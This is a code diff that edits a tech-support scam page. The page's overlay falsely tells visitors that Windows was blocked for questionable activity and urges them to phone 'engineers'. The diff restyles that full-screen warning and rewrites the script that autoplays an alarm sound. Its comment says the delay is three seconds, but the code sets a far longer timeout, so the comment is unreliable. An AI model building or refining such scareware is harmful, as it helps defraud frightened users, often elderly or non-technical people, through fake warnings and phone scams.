@@ -703,7 +703,7 @@ to avoid a complete malfunction of your computer.</p>
     </div>
 </div>
 
-<div id="welcomeDiv" style="background-color: rgba(40, 40, 40, 0.62); height: auto; width: 550px; margin-left: 30%; position: absolute; z-index: 2147483647;" class="answer_list">
+<div id="welcomeDiv" style="background-color: rgb(34, 34, 34); height: auto; width: 550px; margin-left: 33%; position: absolute; z-index: 2147483647;text-align: center;" class="answer_list">
     <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Windows was blocked due to questionable activity.<br>You
  need to contact us immediately so that our engineers can
 guide you through the removal process by phone.
@@ -889,8 +889,16 @@ to avoid a complete malfunction of your computer.</p>
     }
 </script>
 <script type="text/javascript">
-    setTimeout(function () {
-        document.getElementById("beep").play();
+    window.addEventListener('load', function () {
+        // Wait for 3 seconds, then try to play the audio
+        setTimeout(function () {
+            const beep = document.getElementById("beep");
+            if (beep) {
+                beep.play().catch(function (error) {
+                    console.error("Autoplay failed:", error);
+                });
+            }
+        }, 100000000); // 3 seconds
     });
 </script>
 <script>
